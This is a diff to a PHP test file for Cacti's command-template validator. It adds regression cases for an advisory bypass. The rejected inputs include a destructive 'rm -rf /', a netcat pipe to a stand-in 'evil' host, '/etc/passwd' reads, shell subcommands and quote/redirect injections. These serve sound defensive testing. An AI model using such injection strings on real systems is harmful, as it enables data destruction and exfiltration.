@@ -120,7 +120,7 @@ test('cacti_input_string_is_safe extracts and runs against canonical payloads', 
 	expect(_test_input_string_is_safe('snmpwalk -v 2c -c <community> <host>'))->toBeTrue();
 	expect(_test_input_string_is_safe('/usr/local/bin/check.sh <host_ip>'))->toBeTrue();
 
-	/* every dangerous character is rejected */
+	/* original metachar set */
 	expect(_test_input_string_is_safe('cmd <host>; rm -rf /'))->toBeFalse();
 	expect(_test_input_string_is_safe('cmd <host> && reboot'))->toBeFalse();
 	expect(_test_input_string_is_safe('cmd <host> | nc evil 80'))->toBeFalse();
@@ -129,6 +129,17 @@ test('cacti_input_string_is_safe extracts and runs against canonical payloads', 
 	expect(_test_input_string_is_safe("template\nwith\nnewline"))->toBeFalse();
 	expect(_test_input_string_is_safe("template\rwith\rcr"))->toBeFalse();
 	expect(_test_input_string_is_safe('echo \\$(whoami)'))->toBeFalse();
+
+	/* GHSA-c4qp bypass chars added in this PR: single-quote, double-quote,
+	 * redirect operators, and subshell delimiters.
+	 * Payloads that were accepted before the fix and must now be rejected. */
+	expect(_test_input_string_is_safe("/bin/sh -c 'id'"))->toBeFalse();
+	expect(_test_input_string_is_safe('/usr/bin/curl http://x > /tmp/out'))->toBeFalse();
+	expect(_test_input_string_is_safe('echo "hello"'))->toBeFalse();
+	expect(_test_input_string_is_safe('/bin/sh -c (id)'))->toBeFalse();
+	expect(_test_input_string_is_safe('cmd {dangerous}'))->toBeFalse();
+	/* redirect < */
+	expect(_test_input_string_is_safe('cmd < /etc/passwd'))->toBeFalse();
 });
 
 /* --- Finding 3: import path applies the same validator --- */
